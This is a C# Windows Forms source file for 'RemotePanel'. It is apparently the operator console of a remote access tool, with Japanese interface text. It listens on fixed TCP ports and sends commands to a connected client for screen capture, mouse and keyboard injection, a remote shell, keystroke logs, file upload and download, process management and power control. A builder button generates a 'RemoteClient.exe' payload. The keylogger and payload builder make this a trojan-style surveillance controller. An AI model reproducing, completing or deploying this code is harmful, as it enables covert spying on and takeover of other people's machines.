using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Reflection;

namespace RemotePanel
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private const int MOUSEEVENTF_LEFTDOWN = 0x2;
        private const int MOUSEEVENTF_LEFTUP = 0x4;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x8;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        private TCP.Server serverMain = null;
        private TCP.Server serverPing = null;
        private TCP.Server serverCapture = null;
        private TCP.Server serverMouse = null;
        private TCP.Server serverKeyboard = null;

        private const int serverMain_Port = 61927;
        private const int serverPing_Port = 61926;
        private const int serverCapture_Port = 61928;
        private const int serverMouse_Port = 62899;
        private const int serverKeyboard_Port = 62900;
        private const int serverCommand_Port = 61929;
        private const int serverLogger_Port = 61944;
        private const int serverExplorer_Port = 61971;
        private const int serverUploader_Port = 61982;
        private const int serverDownloader_Port = 61983;
        private const int serverTaskManeger_Port = 62190;

        private static bool isConnected = true;

        private Forms.BuildSet forms_BuildSet = null;
        private Forms.SendMsg forms_SendMsg = null;
        private Forms.ScreenShot forms_ScreenShot = null;
        private Forms.GetInfo forms_GetInfo = null;
        private Forms.CommandForm forms_CommandForm = null;
        private Forms.PowerSettings forms_PowerSettings = null;
        private Forms.KeyboardLogs forms_KeyboardLogs = null;
        private Forms.Explorer.MainExplorer forms_MainExplorer = null;
        private Forms.TaskManeger forms_TaskManeger = null;
        private Forms.VersionShow forms_VersionShow = null;
        private Forms.SendImage forms_SendImage = null;

        private void Cmd_start_server_bt_Click(object sender, EventArgs e)
        {
            Task.Factory.StartNew(() =>
            {
                // サーバー設定
                Cmd_stop_server_bt.Enabled = true;
                serverMain = new TCP.Server(serverMain_Port);
                Cap_raw_tx.Text = TCP.Server.GetLocalIP;
                Cap_raw_tx.Text = "接続待機中...";               
                Main_screen_pic.Image = null;
                Cmd_start_server_bt.Enabled = false;
                serverMain.Start();

                Cmd_stop_server_bt.Enabled = false;
                Cap_raw_tx.Text = "接続の確立中...";

                start_ping_server();

            });
        }

        private void Cmd_stop_server_bt_Click(object sender, EventArgs e)
        {
            if (serverMain != null) serverMain.Stop();
            if (serverPing != null) serverPing.Stop();
            if (serverCapture != null) serverCapture.Stop();
            serverMain = null;
            serverPing = null;
            serverCapture = null;
            Cmd_stop_server_bt.Enabled = false;
            Cmd_start_server_bt.Enabled = true;
            isConnected = false;
            Cap_raw_tx.Text = "停止";
            Cmd_panel.Enabled = false;
            Cap_start_capture_bt.Enabled = false;
            Cap_stop_capture_bt.Enabled = false;
            Cap_send_mouse_ckb.Checked = false;
            Cap_keyinput_send_chb.Checked = false;
            Cap_mouse_X_tx.Text = "";
            Cap_mouse_Y_tx.Text = "";

            if (forms_SendMsg != null)
                if (!forms_SendMsg.IsDisposed)
                    forms_SendMsg.Dispose();
            if (forms_ScreenShot != null)
                if (!forms_ScreenShot.IsDisposed)
                    forms_ScreenShot.Dispose();
            if (forms_KeyboardLogs != null)
                if (!forms_KeyboardLogs.IsDisposed)
                    forms_KeyboardLogs.Dispose();
            if (forms_CommandForm != null)
                if (!forms_CommandForm.IsDisposed)
                    forms_CommandForm.Dispose();
            if (forms_PowerSettings != null)
                if (!forms_PowerSettings.IsDisposed)
                    forms_PowerSettings.Dispose();
            if (forms_MainExplorer != null)
                if (!forms_MainExplorer.IsDisposed)
                    forms_MainExplorer.Dispose();
            if (forms_TaskManeger != null)
                if (!forms_TaskManeger.IsDisposed)
                    forms_TaskManeger.Dispose();
            if (forms_SendImage != null)
                if (!forms_SendImage.IsDisposed)
                    forms_SendImage.Dispose();
            forms_GetInfo = null;
            GC.Collect();
        }

        private void start_ping_server()
        {
            try
            {
                serverMain.RecvBytes();
                serverMain.Send("+START_PING " + serverPing_Port.ToString());
                serverPing = new TCP.Server(serverPing_Port);                
                isConnected = true;
                serverPing.Start();

                Cmd_panel.Enabled = true;
                Cap_start_capture_bt.Enabled = true;
                Cmd_stop_server_bt.Enabled = true;
                System.Media.SystemSounds.Asterisk.Play();
            }
            catch (Exception ex)
            {
                Cmd_stop_server_bt_Click(null, EventArgs.Empty);
                if (Cap_auto_restart_server_chb.Checked)
                {
                    Cmd_start_server_bt_Click(null, EventArgs.Empty);
                }
                return;
            }

            Task.Factory.StartNew(() =>
            {
                try
                {
                    System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch();
                    while (true)
                    {
                        serverPing.Send("+PING");
                        sw.Start();
                        serverPing.RecvBytes();
                        sw.Stop();
                        Cap_raw_tx.Text = serverPing.GetClientIP +" - "+ sw.Elapsed.TotalMilliseconds.ToString() +"ms";
                        sw.Reset();
                        Thread.Sleep(1000);
                    }
                }
                catch (NullReferenceException)
                {
                    Cmd_stop_server_bt_Click(null, EventArgs.Empty);
                }
                catch (Exception ex)
                {
                    Cmd_stop_server_bt_Click(null, EventArgs.Empty);
                    MessageBox.Show(ex.Message, "Client Error", MessageBoxButtons.OK, MessageBoxIcon.Stop, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                }
            });
        }

        private void start_capture_server()
        {

                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        Cap_start_capture_bt.Enabled = false;
                        serverMain.Send("+START_CAP " + serverCapture_Port.ToString());

                        serverCapture = new TCP.Server(serverCapture_Port);
                        serverCapture.Start();                       
                        Cap_stop_capture_bt.Enabled = true;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    }
                    try
                    {
                        while (isConnected)
                        {
                            ImageConverter imgconv = new ImageConverter();
                            byte[] imgBytes = serverCapture.RecvBytes();
                            try
                            {
                                Main_screen_pic.Image = (Image)imgconv.ConvertFrom(imgBytes);
                            } catch { }
                            serverCapture.Send(Cap_fps_num_tr.Value.ToString() + ",");
                            Thread.Sleep(1);
                        }
                        serverCapture.Stop();
                        serverCapture = null;
                        Main_screen_pic.Image = null;
                    }
                    catch (Exception ex)
                    {
                        if (serverCapture != null) serverCapture.Stop();
                        serverCapture = null;
                        Cap_start_capture_bt.Enabled = true;
                        Cap_stop_capture_bt.Enabled = false;
                        Main_screen_pic.Image = null;
                    }
                });          
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void Cap_fps_num_tr_Scroll(object sender, EventArgs e)
        {
            Cap_set_ms_gb.Text = "キャプチャーミリ秒: "+ Cap_fps_num_tr.Value.ToString() +"ms";
        }

        private void Cap_start_capture_bt_Click(object sender, EventArgs e)
        {
            start_capture_server();
        }

        private void Cap_stop_capture_bt_Click(object sender, EventArgs e)
        {
            serverCapture.Stop();
            Cap_send_mouse_ckb.Checked = false;
            Cap_keyinput_send_chb.Checked = false;
            Cap_start_capture_bt.Enabled = false;
            Cap_stop_capture_bt.Enabled = false;
        }

        private void Cap_set_all_screen_chb_CheckedChanged(object sender, EventArgs e)
        {
            if (Cap_set_all_screen_chb.Checked)
            {
                Main_screen_pic.SizeMode = PictureBoxSizeMode.Zoom;
                Main_screen_pic.Dock = DockStyle.Fill;
                Cap_send_mouse_ckb.Checked = false;
                Cap_send_mouse_ckb.Enabled = false;
            }
            else
            {
                Main_screen_pic.Dock = DockStyle.None;
                Main_screen_pic.Location = new Point(0, 0);
                Main_screen_pic.SizeMode = PictureBoxSizeMode.AutoSize;
                Cap_send_mouse_ckb.Enabled = true;
            }
        }

        private void Cmd_build_bin_bt_Click(object sender, EventArgs e)
        {
            if (forms_BuildSet == null)
            {
                forms_BuildSet = new Forms.BuildSet();
                forms_BuildSet.serverMain_Port = serverMain_Port;
                forms_BuildSet.SetSaveText = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) +@"\RemoteClient.exe";
                forms_BuildSet.Show();
            }
            else if (forms_BuildSet.IsDisposed)
            {
                forms_BuildSet = new Forms.BuildSet();
                forms_BuildSet.serverMain_Port = serverMain_Port;
                forms_BuildSet.SetSaveText = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\RemoteClient.exe";
                forms_BuildSet.Show();
            }
            else
            {
                forms_BuildSet.Activate();
            }
        }


        private void Cmd_start_shell_Click(object sender, EventArgs e)
        {
            if (forms_CommandForm == null)
            {
                forms_CommandForm = new Forms.CommandForm();
                forms_CommandForm.serverMain = serverMain;
                forms_CommandForm.Show();
            }
            else if (forms_CommandForm.IsDisposed)
            {
                forms_CommandForm = new Forms.CommandForm();
                forms_CommandForm.serverMain = serverMain;
                forms_CommandForm.Show();
            }
            else
            {
                forms_CommandForm.Activate();
            }
        }

        private void Cmd_send_msg_bt_Click(object sender, EventArgs e)
        {
            if (forms_SendMsg == null)
            {
                forms_SendMsg = new Forms.SendMsg();
                forms_SendMsg.serverMain = serverMain;
                forms_SendMsg.Show();
            }
            else if (forms_SendMsg.IsDisposed)
            {
                forms_SendMsg = new Forms.SendMsg();
                forms_SendMsg.serverMain = serverMain;
                forms_SendMsg.Show();
            }
            else
            {
                forms_SendMsg.Activate();
            }
        }

        private void Cmd_save_screenshot_bt_Click(object sender, EventArgs e)
        {
            if (forms_ScreenShot == null)
            {
                forms_ScreenShot = new Forms.ScreenShot();
                forms_ScreenShot.serverMain = serverMain;
                forms_ScreenShot.Show();
            }
            else if (forms_ScreenShot.IsDisposed)
            {
                forms_ScreenShot = new Forms.ScreenShot();
                forms_ScreenShot.serverMain = serverMain;
                forms_ScreenShot.Show();
            }
            else
            {
                forms_ScreenShot.Activate();
            }

        }

        private void Cmd_get_info_bt_Click(object sender, EventArgs e)
        {
            if (forms_GetInfo == null)
            {
                forms_GetInfo = new Forms.GetInfo();
                forms_GetInfo.serverMain = serverMain;
                forms_GetInfo.Show();
            }
            else if (forms_GetInfo.IsDisposed)
            {
                forms_GetInfo = new Forms.GetInfo();
                forms_GetInfo.serverMain = serverMain;
                forms_GetInfo.Show();
            }
            else
            {
                forms_GetInfo.Activate();
            }
        }

        private void Cmd_send_file_bt_Click(object sender, EventArgs e)
        {
            if (forms_MainExplorer == null)
            {
                forms_MainExplorer = new Forms.Explorer.MainExplorer();
                forms_MainExplorer.serverMain = serverMain;
                forms_MainExplorer.serverExplorer_Port = serverExplorer_Port;
                forms_MainExplorer.serverUpload_Port = serverUploader_Port;
                forms_MainExplorer.serverDownload_Port = serverDownloader_Port;
                forms_MainExplorer.Show();
            }
            else if (forms_MainExplorer.IsDisposed)
            {
                forms_MainExplorer = new Forms.Explorer.MainExplorer();
                forms_MainExplorer.serverMain = serverMain;
                forms_MainExplorer.serverExplorer_Port = serverExplorer_Port;
                forms_MainExplorer.serverUpload_Port = serverUploader_Port;
                forms_MainExplorer.serverDownload_Port = serverDownloader_Port;
                forms_MainExplorer.Show();
            }
            else
            {
                forms_MainExplorer.Activate();
            }
        }

        private void Cmd_power_send_bt_Click(object sender, EventArgs e)
        {
            if (forms_PowerSettings == null)
            {
                forms_PowerSettings = new Forms.PowerSettings();
                forms_PowerSettings.serverMain = serverMain;
                forms_PowerSettings.Show();
            }
            else if (forms_PowerSettings.IsDisposed)
            {
                forms_PowerSettings = new Forms.PowerSettings();
                forms_PowerSettings.serverMain = serverMain;
                forms_PowerSettings.Show();
            }
            else
            {
                forms_PowerSettings.Activate();
            }
        }

        private void Cmd_keyboard_log_bt_Click(object sender, EventArgs e)
        {
            if (forms_KeyboardLogs == null)
            {
                forms_KeyboardLogs = new Forms.KeyboardLogs();
                forms_KeyboardLogs.serverMain = serverMain;
                forms_KeyboardLogs.serverLogger_Port = serverLogger_Port;
                forms_KeyboardLogs.Show();
            }
            else if (forms_KeyboardLogs.IsDisposed)
            {
                forms_KeyboardLogs = new Forms.KeyboardLogs();
                forms_KeyboardLogs.serverMain = serverMain;
                forms_KeyboardLogs.serverLogger_Port = serverLogger_Port;
                forms_KeyboardLogs.Show();
            }
            else
            {
                forms_KeyboardLogs.Activate();
            }
        }

        private void Cmd_task_mgr_bt_Click(object sender, EventArgs e)
        {
            if (forms_TaskManeger == null)
            {
                forms_TaskManeger = new Forms.TaskManeger();
                forms_TaskManeger.serverMain = serverMain;
                forms_TaskManeger.serverTaskManeger_Port = serverTaskManeger_Port;
                forms_TaskManeger.Show();
            }
            else if (forms_TaskManeger.IsDisposed)
            {
                forms_TaskManeger = new Forms.TaskManeger();
                forms_TaskManeger.serverMain = serverMain;
                forms_TaskManeger.serverTaskManeger_Port = serverTaskManeger_Port;
                forms_TaskManeger.Show();
            }
            else
            {
                forms_TaskManeger.Activate();
            }
        }

        private void Cmd_keyboardinput_bt_Click(object sender, EventArgs e)
        {
            if (forms_SendImage == null)
            {
                forms_SendImage = new Forms.SendImage();
                forms_SendImage.serverMain = serverMain;
                forms_SendImage.Show();
            }
            else if (forms_SendImage.IsDisposed)
            {
                forms_SendImage = new Forms.SendImage();
                forms_SendImage.serverMain = serverMain;
                forms_SendImage.Show();
            }
            else
            {
                forms_SendImage.Activate();
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void Cap_send_mouse_ckb_CheckedChanged(object sender, EventArgs e)
        {
            if (Cap_send_mouse_ckb.Checked & (serverMain != null) & (serverCapture !=null))
            {
                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        serverMain.Send("+START_MOUSE " + serverMouse_Port.ToString());
                        serverMouse = new TCP.Server(serverMouse_Port);
                        serverMouse.Start();
                    }
                    catch
                    {
                        Cap_send_mouse_ckb.Checked = false;
                    }
                });
            }
            else
            {
                if (serverMouse != null) serverMouse.Stop();
                Cap_send_mouse_ckb.Checked = false;
                serverMouse = null;
            }
        }

        private void Cap_keyinput_send_chb_CheckedChanged(object sender, EventArgs e)
        {
            if (Cap_keyinput_send_chb.Checked & (serverMain != null))
            {
                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        serverMain.Send("+START_KEYBOARD " + serverKeyboard_Port.ToString());
                        serverKeyboard = new TCP.Server(serverKeyboard_Port);
                        serverKeyboard.Start();
                    }
                    catch
                    {
                        Cap_keyinput_send_chb.Checked = false;
                    }
                });
            }
            else
            {
                if (serverKeyboard != null) serverKeyboard.Stop();
                Cap_keyinput_send_chb.Checked = false;
                serverKeyboard = null;
            }
        }

        private void Main_screen_pic_MouseDown(object sender, MouseEventArgs e)
        {
        }

        private void Main_screen_pic_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if ((serverMain != null) & (serverCapture != null) & (serverMouse != null) & Cap_send_mouse_ckb.Checked)
            {
                if (e.Button == MouseButtons.Right)
                    mouseFunction("+MOUSE_DC_RIGHT");
                else
                    mouseFunction("+MOUSE_DC_LEFT");
            }
        }

        private void Main_screen_pic_MouseClick(object sender, MouseEventArgs e)
        {
            if ((serverMain != null) & (serverCapture != null) & (serverMouse != null) & Cap_send_mouse_ckb.Checked)
            {               
                if (e.Button == MouseButtons.Right)
                    mouseFunction("+MOUSE_C_RIGHT");
                else
                    mouseFunction("+MOUSE_C_LEFT");
            }
        }

        private void Main_screen_pic_MouseMove(object sender, MouseEventArgs e)
        {
            if ((serverMain != null) & (serverCapture != null))
            {
                Cap_mouse_X_tx.Text = e.X.ToString();
                Cap_mouse_Y_tx.Text = e.Y.ToString();
            }
        }

        private void mouseFunction(string sendCmd)
        {
            Task.Factory.StartNew(() =>
            {
                string mousePoint = Cap_mouse_X_tx.Text + "," + Cap_mouse_Y_tx.Text;
                try
                {
                    serverMouse.Send(sendCmd +" " + mousePoint);
                }
                catch
                {
                    Cap_send_mouse_ckb.Checked = false;
                }
            });
        }

        private bool ctrlKeyInput = false;
        private void MainForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Space)
                e.Handled = true;
            else if ((serverMain != null) & (serverCapture != null) & (serverMouse != null) & Cap_send_mouse_ckb.Checked & !ctrlKeyInput & e.Control)
            {
                mouseFunction("+MOUSE_D_LEFT");
                ctrlKeyInput = true;
            }
        }

        private void MainForm_KeyUp(object sender, KeyEventArgs e)
        {
            if ((serverMain != null) & (serverCapture != null) & (serverMouse != null) & Cap_send_mouse_ckb.Checked & ctrlKeyInput)
            {
                mouseFunction("+MOUSE_U_LEFT");
                ctrlKeyInput = false;
            }
        }

        private void MainForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            if ((serverMain != null) & (serverKeyboard != null) & Cap_keyinput_send_chb.Checked)
            {
                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        serverKeyboard.Send(e.KeyChar.ToString());
                    }
                    catch (Exception ex)
                    {
                        Cap_keyinput_send_chb.Checked = false;
                    }
                });
            }
        }

        private void Cap_auto_restart_server_chb_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void Cap_always_show_top_chb_CheckedChanged(object sender, EventArgs e)
        {
            TopMost = !TopMost;
        }

        private void Cmd_connection_shutdown_bt_Click(object sender, EventArgs e)
        {
            var result = MessageBox.Show("完全に接続が切断されると、クライアントプログラムが再実行されるまで接続できなくなります。接続を完全に切断しますか？　", "RemotePanel - 接続の切断", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (result == DialogResult.OK)
            {
                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        Cmd_panel.Enabled = false;
                        Cmd_stop_server_bt.Enabled = false;
                        serverMain.Send("+SHUTDOWN");
                        Cmd_stop_server_bt_Click(null, EventArgs.Empty);
                    }
                    catch
                    {
                        MessageBox.Show("接続が切断されているか、クライアントに切断コマンドを送信できませんでした。", "RemotePanel", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    }
                });
            }
        }

        private void Cap_developer_linklabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://twitter.com/betacode_");
        }

        private void Cap_versionShow_linklabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (forms_VersionShow == null)
            {
                forms_VersionShow = new Forms.VersionShow();
                forms_VersionShow.Show();
            }
            else if (forms_VersionShow.IsDisposed)
            {
                forms_VersionShow = new Forms.VersionShow();
                forms_VersionShow.Show();
            }
            else
                forms_VersionShow.Activate();
        }
    }
}
